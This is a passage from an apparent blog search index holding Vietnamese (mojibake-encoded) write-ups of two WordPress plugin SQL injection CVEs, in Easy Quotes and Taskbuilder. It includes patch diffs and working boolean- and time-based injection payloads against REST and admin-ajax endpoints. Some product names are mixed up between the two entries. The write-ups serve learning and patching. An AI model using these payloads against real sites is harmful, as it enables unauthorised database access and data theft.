bá»‹ upload file náº·ng gÃ¢y quÃ¡ táº£i server.\n","permalink":"//localhost:1313/vi/posts/2025-09-20-wordpress-local-and-debugging/","summary":"\u003cp\u003e\u003cstrong\u003eWordPress\u003c/strong\u003e lÃ  má»™t há»‡ thá»‘ng quáº£n lÃ½ ná»™i dung (CMS) máº¡nh máº½ vÃ  phá»• biáº¿n nháº¥t cho phÃ©p báº¡n táº¡o, quáº£n lÃ½ vÃ  tÃ¹y chá»‰nh cÃ¡c trang web vÃ  blog má»™t cÃ¡ch dá»… dÃ ng. NÃ³ lÃ  open-source CMS, Ä‘Æ°á»£c xÃ¢y dá»±ng trÃªn PHP vÃ  sá»­ dá»¥ng cÆ¡ sá»Ÿ dá»¯ liá»‡u MySQL hoáº·c Maria DB.\u003c/p\u003e\n\u003cul\u003e\n\u003cli\u003eRa Ä‘á»i nÄƒm 2003, ban Ä‘áº§u chá»‰ Ä‘á»ƒ viáº¿t blog, sau Ä‘Ã³ phÃ¡t triá»ƒn thÃ nh ná»n táº£ng táº¡o website, cá»­a hÃ ng online, diá»…n Ä‘Ã n, landing pageâ€¦\u003c/li\u003e\n\u003cli\u003eHiá»‡n nay, hÆ¡n 40% website trÃªn tháº¿ giá»›i cháº¡y báº±ng WordPress.\u003c/li\u003e\n\u003c/ul\u003e\n\u003cp\u003eCÃ³ 2 phiÃªn báº£n WordPress:\u003c/p\u003e","title":"WordPress Local and Debugging"},{"content":"Lá»— há»•ng xáº£y ra trÃªn plugin Easy Quotes cá»§a WordPress trÆ°á»›c phiÃªn báº£n 1.2.3. Äiá»u nÃ y cÃ³ thá»ƒ cho phÃ©p káº» táº¥n cÃ´ng trá»±c tiáº¿p tÆ°Æ¡ng tÃ¡c vá»›i cÆ¡ sá»Ÿ dá»¯ liá»‡u cá»§a báº¡n, bao gá»“m khÃ´ng giá»›i háº¡n á»Ÿ viá»‡c Ä‘Ã¡nh cáº¯p thÃ´ng tin.\nCVE ID: CVE-2025-26943 Product: WordPress Easy Quotes Plugin Vulnerability Type: SQL Injection Affected Versions: \u0026lt;= 1.2.2 CVSS severity: High (9.3) Required Privilege: Unauthenticated Requirements Local WordPress and Debugging Taskbuilder Plugin: v1.2.2(vul) vÃ  v1.2.3(fix) diff tool: meld hoáº·c báº¥t cá»© tool nÃ o cÃ³ thá»ƒ compare Ä‘á»ƒ tháº¥y Ä‘Æ°á»£c sá»± khÃ¡c biá»‡t giá»¯a 2 version Analysis á»¨ng dá»¥ng Ä‘Ã£ Ä‘Æ°a trá»±c tiáº¿p dá»¯ liá»‡u tá»« ngÆ°á»i dÃ¹ng vÃ o cÃ¢u query SQL mÃ  khÃ´ng sá»­ dá»¥ng cÃ¡c biá»‡n phÃ¡p báº£o vá»‡ khiáº¿n lá»— há»•ng SQL Injection xáº£y ra.\nPatch Diff DÃ¹ng diff tool báº¥t kÃ¬ Ä‘á»ƒ so sÃ¡nh sá»± khÃ¡c biá»‡t giá»¯a báº£n lá»—i vÃ  báº£n vÃ¡. CÃ³ sá»± khÃ¡c biá»‡t rÃµ á»Ÿ file includes/quotes-data.php\nprivate static function get_family_data($family) { /** @var wpdb $wpdb */ global $wpdb; $tablename = $wpdb-\u0026gt;prefix . \u0026#39;easy-quotes-families\u0026#39;; return $wpdb-\u0026gt;get_row(\u0026#34;SELECT * FROM `\u0026#34;.$tablename.\u0026#34;` WHERE `family`=\u0026#39;\u0026#34;.$family.\u0026#34;\u0026#39;;\u0026#34;); } Báº£n vÃ¡ sá»­ dá»¥ng $wpdb-\u0026gt;prepare() thay vÃ¬ truyá»n trá»±c tiáº¿p dá»¯ liá»‡u tá»« ngÆ°á»i dÃ¹ng vÃ o cÃ¢u query.\nprivate static function get_family_data($family) { /** @var wpdb $wpdb */ global $wpdb; $tablename = $wpdb-\u0026gt;prefix . \u0026#39;easy-quotes-families\u0026#39;; $sql = $wpdb-\u0026gt;prepare( \u0026#34;SELECT * FROM %i WHERE `family` = %s\u0026#34;, $tablename, $family ); return $wpdb-\u0026gt;get_row($sql); } CÃ³ nhiá»u hÃ m cÅ©ng Ä‘Æ°á»£c vÃ¡ báº±ng cÃ¡ch trÃªn, nhÆ°: get_font_variant($family_id, $variant_id), get_font_variants($family), get_fonts($category = -1)\nTuy get_fonts_categories() Ä‘Ã£ Ä‘Æ°á»£c vÃ¡ nhÆ°ng nÃ³ khÃ´ng chá»©a dá»¯ liá»‡u tá»« ngÆ°á»i dÃ¹ng, nÃªn khÃ´ng cáº§n quan tÃ¢m\npublic static function get_fonts_categories() { /** @var wpdb $wpdb */ global $wpdb; $tablename = $wpdb-\u0026gt;prefix . \u0026#39;easy-quotes-categories\u0026#39;; $sql = $wpdb-\u0026gt;prepare( \u0026#34;SELECT `category_id`, `category` FROM %i\u0026#34;, $tablename ); return $wpdb-\u0026gt;get_results($sql); } How it work? Ta khai thÃ¡c lá»—i SQL Injection trong hÃ m get_family_data($family), cÃ¡c hÃ m cÃ²n láº¡i khai thÃ¡c tÆ°Æ¡ng tá»±.\nget_family_data() lÃ  hÃ m public trong class Quotes_Data\nclass Quotes_Data { function __construct() { add_filter(\u0026#39;posts_where\u0026#39;, array($this, \u0026#39;posts_where\u0026#39;), 10, 2); } // other function public static function get_font_variants($family) { $familyData = self::get_family_data($family); // other logic } public static function get_family($family, $variant_id) { $family_data = (array)self::get_family_data($family); // other logic } private static function get_family_data($family) { /** @var wpdb $wpdb */ global $wpdb; $tablename = $wpdb-\u0026gt;prefix . \u0026#39;easy-quotes-families\u0026#39;; return $wpdb-\u0026gt;get_row(\u0026#34;SELECT * FROM `\u0026#34;.$tablename.\u0026#34;` WHERE `family`=\u0026#39;\u0026#34;.$family.\u0026#34;\u0026#39;;\u0026#34;); } } get_family_data() Ä‘Æ°á»£c gá»i trong 2 hÃ m get_family() vÃ  get_font_variants() cá»§a class Quotes_Data, Ä‘á»ƒ biáº¿t chÃºng sá»­ dá»¥ng á»Ÿ Ä‘Ã¢u, ta tÃ¬m kiáº¿n vá»›i tá»« khÃ³a get_family hoáº·c get_font_variants\nHÃ m get_font_variants() Ä‘Æ°á»£c gá»i trong hÃ m rest_route_callback_font_variants() cá»§a class Quotes_Rest_Route\nclass Quotes_Rest_Route { function __construct() { add_action(\u0026#39;rest_api_init\u0026#39;, array($this, \u0026#39;rest_api_init\u0026#39;)); } /** * Register my REST route * * @return void */ function rest_api_init($wp_rest_server) { $args = [ \u0026#39;method\u0026#39; =\u0026gt; WP_REST_Server::READABLE, \u0026#39;callback\u0026#39; =\u0026gt; [$this, \u0026#39;rest_route_callback_quote\u0026#39;], \u0026#39;permission_callback\u0026#39; =\u0026gt; \u0026#39;__return_true\u0026#39; ]; register_rest_route(\u0026#39;layart/v1\u0026#39;, \u0026#39;/quote\u0026#39;, $args); // other logic $args[\u0026#39;callback\u0026#39;] = [$this, \u0026#39;rest_route_callback_font_variants\u0026#39;]; register_rest_route(\u0026#39;layart/v1\u0026#39;, \u0026#39;/font-variants\u0026#39;, $args); } // other function function rest_route_callback_font_variants(WP_REST_Request $request) { $family = $request-\u0026gt;get_param(\u0026#39;family\u0026#39;); $family = isset($family) ? $family : \u0026#34;Shadows Into Light\u0026#34;; $response = Quotes_Data::get_font_variants($family); return rest_ensure_response($response); } } HÃ m khá»Ÿi táº¡o cá»§a class Quotes_Rest_Route sá»­ dá»¥ng add_action(hook_name, callback) vá»›i hook_name lÃ  rest_api_init Ä‘á»ƒ Ä‘Äƒng kÃ½ cÃ¡c endpoint tÃ¹y chá»‰nh vá»›i REST API System cá»§a WordPress\nCallback rest_api_init sá»­ dá»¥ng register_rest_route nhiá»u láº§n Ä‘á»ƒ táº¡o cÃ¡c endpoint dÆ°á»›i namespace layart/v1\nrest_route_callback_font_variants lÃ  callback cá»§a endpoint /wp-json/layart/v1/font-variants?family=family_name\n$family máº·c Ä‘á»‹nh lÃ  Shadows Into Light náº¿u khÃ´ng Ä‘Æ°á»£c truyá»n trong param.\nExploit Detect SQLi Ta thá»­ ká»¹ thuáº­t Boolean-based SQL Injection Ä‘á»ƒ kiá»ƒm tra xem tham sá»‘ family cÃ³ dá»… bá»‹ chÃ¨n lá»‡nh SQL hay khÃ´ng.\nTrue request: Khi Ä‘Ã³, cÃ¢u query thá»±c thi sáº½ trá»Ÿ thÃ nh:\nSELECT * FROM wp_easy-quotes-families WHERE family=\u0026#39;Roboto\u0026#39;+AND+\u0026#39;1\u0026#39;=\u0026#39;1\u0026#39;\u0026#34; Äiá»u kiá»‡n AND '1'='1' luÃ´n Ä‘Ãºng =\u0026gt; query há»£p lá»‡, tráº£ vá» dá»¯ liá»‡u bÃ¬nh thÆ°á»ng.\nFalse request: Khi Ä‘Ã³, cÃ¢u query thá»±c thi sáº½ trá»Ÿ thÃ nh:\nSELECT * FROM wp_easy-quotes-families WHERE family=\u0026#39;Roboto\u0026#39;+AND+\u0026#39;1\u0026#39;=\u0026#39;2\u0026#39;\u0026#34; Äiá»u kiá»‡n AND '1'='2' luÃ´n sai =\u0026gt; query khÃ´ng khá»›p =\u0026gt; tráº£ vá» [].\nGet First Letter of Database Name Äiá»u kiá»‡n tiÃªn quyáº¿t Ä‘á»ƒ dump Ä‘Æ°á»£c háº¿t data lÃ  pháº£i dump Ä‘Æ°á»£c 1 kÃ½ tá»± báº¥t ká»³ cá»§a tÃªn database, náº¿u láº¥y Ä‘Æ°á»£c thÃ¬ toÃ n bá»™ data Ä‘á»u dump Ä‘Æ°á»£c.\nDatabase name Ä‘Æ°á»£c tÃ´i Ä‘áº·t tÃªn lÃ  wordpress nÃªn kÃ­ tá»± Ä‘áº§u tiÃªn lÃ  w\nResponse tráº£ vá» dá»¯ liá»‡u bÃ¬nh thÆ°á»ng =\u0026gt; kÃ­ tá»± Ä‘áº§u tiÃªn lÃ  w\nKhi Ä‘Ã³, cÃ¢u query thá»±c thi sáº½ trá»Ÿ thÃ nh:\nSELECT * FROM wp_easy-quotes-families WHERE family=\u0026#39;Roboto\u0026#39;+AND+SUBSTRING(DATABASE(),1,1)=\u0026#39;w\u0026#39;\u0026#34; Conclusion Lá»— há»•ng CVE-2025-26943 trong plugin WordPress Easy Quotes trÆ°á»›c phiÃªn báº£n 1.2.3 xuáº¥t phÃ¡t tá»« viá»‡c khÃ´ng sá»­ dá»¥ng cÆ¡ cháº¿ chuáº©n bá»‹ truy váº¥n ($wpdb-\u0026gt;prepare) mÃ  truyá»n trá»±c tiáº¿p dá»¯ liá»‡u tá»« ngÆ°á»i dÃ¹ng vÃ o cÃ¢u lá»‡nh SQL dáº«n Ä‘áº¿n lá»— há»•ng SQL Injection.\nBáº£n vÃ¡ chÃ­nh thá»©c Ä‘Ã£ thay tháº¿ viá»‡c ná»‘i chuá»—i báº±ng cÃ¡ch dÃ¹ng $wpdb-\u0026gt;prepare, giÃºp Ä‘áº£m báº£o dá»¯ liá»‡u Ä‘áº§u vÃ o Ä‘Æ°á»£c kiá»ƒm soÃ¡t vÃ  an toÃ n hÆ¡n.\nKey takeaways:\nLuÃ´n sá»­ dá»¥ng $wpdb-\u0026gt;prepare() khi lÃ m viá»‡c vá»›i database trong WordPress Ä‘á»ƒ trÃ¡nh SQL Injection. ThÆ°á»ng xuyÃªn cáº­p nháº­t plugin vÃ  kiá»ƒm tra báº£o máº­t Ä‘á»ƒ trÃ¡nh trá»Ÿ thÃ nh má»¥c tiÃªu táº¥n cÃ´ng. References SQL Injection cheat sheet - PortSwigger\nWordPress Easy Quotes Plugin \u0026lt;= 1.2.2 is vulnerable to SQL Injection\n","permalink":"//localhost:1313/vi/posts/2025-09-23-cve-2025-26943/","summary":"\u003cp\u003eLá»— há»•ng xáº£y ra trÃªn plugin \u003cstrong\u003eEasy Quotes\u003c/strong\u003e cá»§a WordPress trÆ°á»›c phiÃªn báº£n \u003cstrong\u003e1.2.3\u003c/strong\u003e. Äiá»u nÃ y cÃ³ thá»ƒ cho phÃ©p káº» táº¥n cÃ´ng trá»±c tiáº¿p tÆ°Æ¡ng tÃ¡c vá»›i cÆ¡ sá»Ÿ dá»¯ liá»‡u cá»§a báº¡n, bao gá»“m khÃ´ng giá»›i háº¡n á»Ÿ viá»‡c Ä‘Ã¡nh cáº¯p thÃ´ng tin.\u003c/p\u003e\n\u003cul\u003e\n\u003cli\u003e\u003cstrong\u003eCVE ID\u003c/strong\u003e: \u003ca href=\"https://www.cve.org/CVERecord?id=CVE-2025-26943\"\u003eCVE-2025-26943\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003eProduct\u003c/strong\u003e: \u003ca href=\"https://wordpress.org/plugins/easy-quotes/#description\"\u003eWordPress Easy Quotes Plugin\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003eVulnerability Type\u003c/strong\u003e: SQL Injection\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003eAffected Versions\u003c/strong\u003e: \u0026lt;= 1.2.2\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003eCVSS severity\u003c/strong\u003e: High (9.3)\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003eRequired Privilege\u003c/strong\u003e: Unauthenticated\u003c/li\u003e\n\u003c/ul\u003e\n\u003chr\u003e\n\u003ch2 id=\"requirements\"\u003eRequirements\u003c/h2\u003e\n\u003cul\u003e\n\u003cli\u003e\u003ca href=\"https://w41bu1.github.io/posts/wordpress-local-and-debugging/\"\u003e\u003cstrong\u003eLocal WordPress and Debugging\u003c/strong\u003e\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003eTaskbuilder Plugin\u003c/strong\u003e:  v1.2.2(vul) vÃ  v1.2.3(fix)\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003ediff tool\u003c/strong\u003e: \u003cstrong\u003emeld\u003c/strong\u003e hoáº·c báº¥t cá»© tool nÃ o cÃ³ thá»ƒ compare Ä‘á»ƒ tháº¥y Ä‘Æ°á»£c sá»± khÃ¡c biá»‡t giá»¯a 2 version\u003c/li\u003e\n\u003c/ul\u003e\n\u003chr\u003e\n\u003ch2 id=\"analysis\"\u003eAnalysis\u003c/h2\u003e\n\u003cp\u003eá»¨ng dá»¥ng Ä‘Ã£ Ä‘Æ°a trá»±c tiáº¿p dá»¯ liá»‡u tá»« ngÆ°á»i dÃ¹ng vÃ o cÃ¢u query SQL mÃ  \u003cstrong\u003ekhÃ´ng sá»­ dá»¥ng cÃ¡c biá»‡n phÃ¡p báº£o vá»‡\u003c/strong\u003e khiáº¿n lá»— há»•ng SQL Injection xáº£y ra.\u003c/p\u003e","title":"CVE-2025-26943"},{"content":"Lá»— há»•ng xáº£y ra trÃªn plugin Taskbuilder cá»§a WordPress trÆ°á»›c phiÃªn báº£n 4.0.2. Äiá»u nÃ y cÃ³ thá»ƒ cho phÃ©p káº» táº¥n cÃ´ng trá»±c tiáº¿p tÆ°Æ¡ng tÃ¡c vá»›i cÆ¡ sá»Ÿ dá»¯ liá»‡u cá»§a báº¡n, bao gá»“m khÃ´ng giá»›i háº¡n á»Ÿ viá»‡c Ä‘Ã¡nh cáº¯p thÃ´ng tin.\nCVE ID: CVE-2025-39569 Product: WordPress Hostel Plugin Vulnerability Type: SQL Injection Affected Versions: \u0026lt; 4.0.2 CVSS severity: High (8.5) Required Privilege: Subscriber Requirements Local WordPress and Debugging Taskbuilder Plugin: v4.0.1(vul) vÃ  v4.0.2(fix) diff tool: meld hoáº·c báº¥t cá»© tool nÃ o cÃ³ thá»ƒ compare Ä‘á»ƒ tháº¥y Ä‘Æ°á»£c sá»± khÃ¡c biá»‡t giá»¯a 2 version Analysis á»¨ng dá»¥ng Ä‘Ã£ xá»­ lÃ½ dá»¯ liá»‡u Ä‘áº§u vÃ o trÆ°á»›c khi Ä‘Æ°a vÃ o cÃ¢u SQL. Tuy nhiÃªn, trong quÃ¡ trÃ¬nh xÃ¢y dá»±ng truy váº¥n, giÃ¡ trá»‹ nÃ y Ä‘Æ°á»£c chÃ¨n trá»±c tiáº¿p mÃ  khÃ´ng Ä‘Æ°á»£c bao trong dáº¥u nhÃ¡y Ä‘Æ¡n '...'. Äiá»u Ä‘Ã³ khiáº¿n káº» táº¥n cÃ´ng cÃ³ thá»ƒ chÃ¨n thÃªm cÃ¡c thÃ nh pháº§n cÃº phÃ¡p SQL há»£p lá»‡ (nhÆ° OR, AND,...) vÃ o truy váº¥n, dáº«n Ä‘áº¿n lá»— há»•ng SQL Injection.\nPatch Diff DÃ¹ng diff tool báº¥t kÃ¬ Ä‘á»ƒ so sÃ¡nh sá»± khÃ¡c biá»‡t giá»¯a báº£n lá»—i vÃ  báº£n vÃ¡. CÃ³ sá»± khÃ¡c biá»‡t rÃµ á»Ÿ file includes/admin/projects/get_users.php\nTrong phiÃªn báº£n v4.0.1, biáº¿n $proj_id sau khi escape Ä‘Æ°á»£c Ä‘Æ°a tháº³ng vÃ o cÃ¢u truy váº¥n mÃ  khÃ´ng cÃ³ dáº¥u nhÃ¡y Ä‘Æ¡n bao quanh:\n$proj_id = esc_sql($proj_id); $project = $wpdb-\u0026gt;get_row( \u0026#34;SELECT * FROM {$wpdb-\u0026gt;prefix}wppm_project where id = $proj_id\u0026#34; ); á» báº£n v4.0.2, truy váº¥n Ä‘Ã£ Ä‘Æ°á»£c Ä‘iá»u chá»‰nh báº±ng cÃ¡ch Ä‘áº·t $proj_id trong dáº¥u nhÃ¡y Ä‘Æ¡n sau khi escape:\n$proj_id = esc_sql($proj_id); $project = $wpdb-\u0026gt;get_row( \u0026#34;SELECT * FROM {$wpdb-\u0026gt;prefix}wppm_project where id = \u0026#39;$proj_id\u0026#39;\u0026#34; ); Báº£n vÃ¡ nÃ y Ä‘áº£m báº£o ráº±ng giÃ¡ trá»‹ $proj_id sau khi escape Ä‘Æ°á»£c coi lÃ  má»™t chuá»—i literal, khÃ´ng thá»ƒ thoÃ¡t ra khá»i dáº¥u nhÃ¡y Ä‘Æ¡n Ä‘á»ƒ chÃ¨n thÃªm cÃº phÃ¡p SQL, qua Ä‘Ã³ ngÄƒn cháº·n táº¥n cÃ´ng SQL Injection.\nHow it work? File architecture:\nCáº¥u trÃºc chung cá»§a file hiá»‡n táº¡i\n$proj_id = esc_sql($proj_id); $project = $wpdb-\u0026gt;get_row(\u0026#34;SELECT * FROM {$wpdb-\u0026gt;prefix}wppm_project WHERE id = $proj_id\u0026#34;); // Báº¯t Ä‘áº§u buffer Ä‘á»ƒ táº¡o ná»™i dung chÃ­nh (body) cá»§a modal ob_start(); // ... render HTML danh sÃ¡ch users $body = ob_get_clean(); // Báº¯t Ä‘áº§u buffer Ä‘á»ƒ táº¡o pháº§n footer cá»§a modal ob_start(); // ... render HTML cÃ¡c nÃºt thao tÃ¡c (Close, Save) $footer = ob_get_clean(); // Tráº£ dá»¯ liá»‡u JSON Ä‘á»ƒ frontend hiá»ƒn thá»‹ modal echo json_encode([ \u0026#39;body\u0026#39; =\u0026gt; $body, \u0026#39;footer\u0026#39; =\u0026gt; $footer, ]); $proj_id / $project: Láº¥y dá»¯ liá»‡u project tá»« database. ob_start() / ob_get_clean(): Ghi HTML ra buffer thay vÃ¬ xuáº¥t trá»±c tiáº¿p, giÃºp gom ná»™i dung vÃ o biáº¿n. $body / $footer: Chá»©a ná»™i dung HTML Ä‘á»™ng cá»§a modal. json_encode(): Tráº£ JSON cho client, cÃ³ kháº£ nÄƒng Ä‘Æ°á»£c sá»­ dá»¥ng trong Ajax Ä‘á»ƒ hiá»ƒn thá»‹ modal mÃ  khÃ´ng cáº§n refresh trang. File náº±m trong thÆ° má»¥c includes cho tháº¥y ráº±ng nÃ³ sáº½ Ä‘Æ°á»£c gá»i á»Ÿ 1 chá»©c nÄƒng nÃ o Ä‘Ã³ á»Ÿ nÆ¡i khÃ¡c. Äá»ƒ biáº¿t chá»©c nÄƒng nÃ o sá»­ dá»¥ng nÃ³, ta tÃ¬m kiáº¿m vá»›i tá»« khÃ³a get_users.php trong thÆ° má»¥c chá»©a plugin.\nğŸ‘‰ NÃ³ Ä‘Æ°á»£c include trong hÃ m wppm_get_users() cá»§a class WPPM_Admin trong file class-wppm-admin.php. wppm_get_users() lÃ  callback cá»§a action hook trong WordPress.\nWPPM_Admin construct:\nfinal class WPPM_Admin { // constructor public function __construct() { // other action add_action( \u0026#39;wp_ajax_wppm_get_users\u0026#39;,array($this,\u0026#39;wppm_get_users\u0026#39;)); // array($this,\u0026#39;wppm_get_users\u0026#39;)) = $this::wppm_get_users() // other action } } add_action() lÃ  má»™t Plugin API cá»§a WordPress, cho phÃ©p gáº¯n má»™t callback vÃ o má»™t action hook. wp_ajax_wppm_get_users lÃ  tÃªn hook Ajax, vá»›i quy táº¯c Ä‘áº·t tÃªn: wp_ajax_{action} =\u0026gt; Xá»­ lÃ½ Ajax khi user Ä‘Ã£ Ä‘Äƒng nháº­p. wp_ajax_nopriv_{action} =\u0026gt; Xá»­ lÃ½ Ajax khi user chÆ°a Ä‘Äƒng nháº­p. á» Ä‘Ã¢y, action = wppm_get_users. NghÄ©a lÃ  náº¿u trong Ajax request báº¡n gá»­i action=wppm_get_users tá»›i admin-ajax.php, thÃ¬ WordPress sáº½ tÃ¬m callback tÆ°Æ¡ng á»©ng Ä‘á»ƒ xá»­ lÃ½, á»Ÿ Ä‘Ã¢y lÃ  wppm_get_users(). ğŸ‘‰ Ta Ä‘Ã£ biáº¿t Ä‘Æ°á»£c action = wppm_get_users, kiá»ƒm tra xem Ajax nÃ o sá»­ dá»¥ng action nÃ y báº±ng cÃ¡ch tÃ¬m tá»« khÃ³a wppm_get_users trÃªn cÃ¡c file .js trong thÆ° má»¥c chá»©a plugin.\nAction wppm_get_users lÃ  pháº§n data trong request POST cá»§a hÃ m wppm_get_users()\nHÃ m wppm_get_users() sáº½ Ä‘Æ°á»£c Ä‘áº·t trong HTML attribute cá»§a chá»©c nÄƒng project\nTáº¡o project má»›i Truy cáº­p vÃ o project Ä‘Ã³ Inspect code vÃ  tÃ¬m hÃ m wppm_get_users sáº½ Ä‘Æ°á»£c Ä‘áº·t á»Ÿ Ä‘Ã¢u, hÃ nh Ä‘á»™ng nÃ o sáº½ gá»i nÃ³ ğŸ‘‰ Khi click vÃ o icon bÃªn cáº¡nh Users ajax sáº½ hoáº¡t Ä‘á»™ng, gá»­i request Ä‘áº¿n server, láº¥y danh sÃ¡ch cÃ¡c user tham gia project vÃ  mÃ£ HTML hiá»ƒn thá»‹ nÃ³.\nExploit Detect SQLi Báº¯t request báº±ng BurpSuite, gá»­i request vá»›i SQLi payload time base\nPOST /wp-admin/admin-ajax.php HTTP/1.1 ... action=wppm_get_users\u0026amp;proj_id=(SELECT+SLEEP(1)) Thá»i gian pháº£n há»“i bá»‹ delay =\u0026gt; SQL Injection thÃ nh cÃ´ng.\nGet First Letter of Database Name Äiá»u kiá»‡n tiÃªn quyáº¿t Ä‘á»ƒ dump Ä‘Æ°á»£c háº¿t data lÃ  pháº£i dump Ä‘Æ°á»£c 1 kÃ½ tá»± báº¥t ká»³ cá»§a tÃªn database, náº¿u láº¥y Ä‘Æ°á»£c thÃ¬ toÃ n bá»™ data Ä‘á»u dump Ä‘Æ°á»£c.\nGá»­i request vá»›i SQLi payload boolean base vÃ³i proj_id Ä‘Ãºng:\nPOST /wp-admin/admin-ajax.php HTTP/1.1 ... action=wppm_get_users\u0026amp;proj_id=(SELECT+IF(SUBSTRING(DATABASE(),1,1)=0x77,4,999)) Database name Ä‘Æ°á»£c tÃ´i Ä‘áº·t tÃªn lÃ  wordpress nÃªn kÃ­ tá»± Ä‘áº§u tiÃªn lÃ  w tÆ°Æ¡ng á»©ng vá»›i mÃ£ HEX lÃ  0x77\nSá»­ dá»¥ng SUBSTRING(STRING,1,1) Ä‘á»ƒ láº¥y kÃ­ tá»± Ä‘áº§u tiÃªn cá»§a chuá»—i\ná» Ä‘Ã¢y, $proj_id báº±ng 4 vÃ¬ SUBSTRING('wordpress',1,1)=0x77 lÃ  Ä‘Ãºng nÃªn SELECT láº¥y giÃ¡ trá»‹ Ä‘Ãºng trong IF(condition, value if true, value if false), 4 lÃ  giÃ¡ trá»‹ cÃ³ thá»±c trong database, nÃªn response tráº£ vá» chá»©a danh sÃ¡ch ngÆ°á»i tham gia dá»± Ã¡n\nSá»­ dá»¥ng HEX technique Ä‘á»ƒ bypass hÃ m esc_sql() á»Ÿ trÃªn, dÃ¹ng Ä‘á»ƒ so sÃ¡nh khi khÃ´ng sá»­ dÃ¹ng Ä‘Æ°á»£c '\nGá»­i request vá»›i SQLi payload boolean base vÃ³i proj_id sai:\nPOST /wp-admin/admin-ajax.php HTTP/1.1 ... action=wppm_get_users\u0026amp;proj_id=(SELECT+IF(SUBSTRING(DATABASE(),1,1)=0x77,999,4)) Vá»›i proj_id khÃ´ng cÃ³ thá»±c trong database, response sáº½ tráº£ vá» káº¿t quáº£ chá»©a None\nğŸ‘‰ Ta Ä‘Ã£ láº¥y Ä‘Æ°á»£c kÃ­ tá»± Ä‘áº§u tiÃªn cá»§a database name báº±ng ká»¹ thuáº­t boolean base\nproj_id Ä‘Ã¹ng: response khÃ´ng chá»©a None proj_id sai: response chá»©a None CÃ³ thá»ƒ sá»­ dá»¥ng ká»¹ thuáº­t time base nhÆ°ng khi dump sá»‘ lÆ°á»£ng lá»›n data, thá»i gian dump sáº½ ráº¥t lÃ¢u\nConclusion Lá»— há»•ng CVE-2025-39569 trong plugin WordPress Taskbuilder xuáº¥t phÃ¡t tá»« viá»‡c thiáº¿u dáº¥u nhÃ¡y Ä‘Æ¡n '...' bao quanh dá»¯ liá»‡u Ä‘áº§u vÃ o trong cÃ¢u lá»‡nh SQL, khiáº¿n dá»¯ liá»‡u ngÆ°á»i dÃ¹ng cÃ³ thá»ƒ Ä‘Æ°á»£c diá»…n giáº£i nhÆ° má»™t pháº§n cá»§a cÃ¢u lá»‡nh SQL há»£p lá»‡.\nBáº£n vÃ¡ á»Ÿ phiÃªn báº£n 4.0.2 Ä‘Ã£ kháº¯c phá»¥c váº¥n Ä‘á» báº±ng cÃ¡ch Ä‘Æ°a $proj_id vÃ o trong '...', Ä‘áº£m báº£o nÃ³ luÃ´n Ä‘Æ°á»£c xá»­ lÃ½ nhÆ° má»™t literal string trong SQL.\nKey takeaways:\nÆ¯u tiÃªn sá»­ dá»¥ng prepared statements ($wpdb-\u0026gt;prepare() trong WordPress) thay vÃ¬ tá»± chÃ¨n dá»¯ liá»‡u vÃ o query. Äá»‘i vá»›i cÃ¡c plugin WordPress, cáº§n test ká»¹ lÆ°á»¡ng cÃ¡c Ajax endpoint vÃ¬ Ä‘Ã¢y lÃ  nÆ¡i dá»… xuáº¥t hiá»‡n SQLi vÃ  XSS nháº¥t. NgÆ°á»i quáº£n trá»‹ cáº§n thÆ°á»ng xuyÃªn cáº­p nháº­t plugin/theme Ä‘á»ƒ nháº­n báº£n vÃ¡ ká»‹p thá»i. References SQL Injection cheat sheet - PortSwigger\nWordPress Taskbuilder project mnagement tool Plugin \u0026lt;= 4.0.1 is vulnerable to SQL Injection\n","permalink":"//localhost:1313/vi/posts/2025-09-22-cve-2025-39569/","summary":"\u003cp\u003eLá»— há»•ng xáº£y ra trÃªn plugin \u003cstrong\u003eTaskbuilder\u003c/strong\u003e cá»§a WordPress trÆ°á»›c phiÃªn báº£n \u003cstrong\u003e4.0.2\u003c/strong\u003e. Äiá»u nÃ y cÃ³ thá»ƒ cho phÃ©p káº» táº¥n cÃ´ng trá»±c tiáº¿p tÆ°Æ¡ng tÃ¡c vá»›i cÆ¡ sá»Ÿ dá»¯ liá»‡u cá»§a báº¡n, bao gá»“m khÃ´ng giá»›i háº¡n á»Ÿ viá»‡c Ä‘Ã¡nh cáº¯p thÃ´ng tin.\u003c/p\u003e\n\u003cul\u003e\n\u003cli\u003e\u003cstrong\u003eCVE ID\u003c/strong\u003e: \u003ca href=\"https://www.cve.org/CVERecord?id=CVE-2025-39569\"\u003eCVE-2025-39569\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003eProduct\u003c/strong\u003e: \u003ca href=\"https://wordpress.org/plugins/taskbuilder/\"\u003eWordPress Hostel Plugin\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003eVulnerability Type\u003c/strong\u003e: SQL Injection\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003eAffected Versions\u003c/strong\u003e: \u0026lt; 4.0.2\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003eCVSS severity\u003c/strong\u003e: High (8.5)\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003eRequired Privilege\u003c/strong\u003e: Subscriber\u003c/li\u003e\n\u003c/ul\u003e\n\u003chr\u003e\n\u003ch2 id=\"requirements\"\u003eRequirements\u003c/h2\u003e\n\u003cul\u003e\n\u003cli\u003e\u003ca href=\"https://w41bu1.github.io/posts/wordpress-local-and-debugging/\"\u003e\u003cstrong\u003eLocal WordPress and Debugging\u003c/strong\u003e\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003eTaskbuilder Plugin\u003c/strong\u003e:  v4.0.1(vul) vÃ  v4.0.2(fix)\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003ediff tool\u003c/strong\u003e: \u003cstrong\u003emeld\u003c/strong\u003e hoáº·c báº¥t cá»© tool nÃ o cÃ³ thá»ƒ compare Ä‘á»ƒ tháº¥y Ä‘Æ°á»£c sá»± khÃ¡c biá»‡t giá»¯a 2 version\u003c/li\u003e\n\u003c/ul\u003e\n\u003chr\u003e\n\u003ch2 id=\"analysis\"\u003eAnalysis\u003c/h2\u003e\n\u003cp\u003eá»¨ng dá»¥ng Ä‘Ã£ \u003cstrong\u003exá»­ lÃ½ dá»¯ liá»‡u 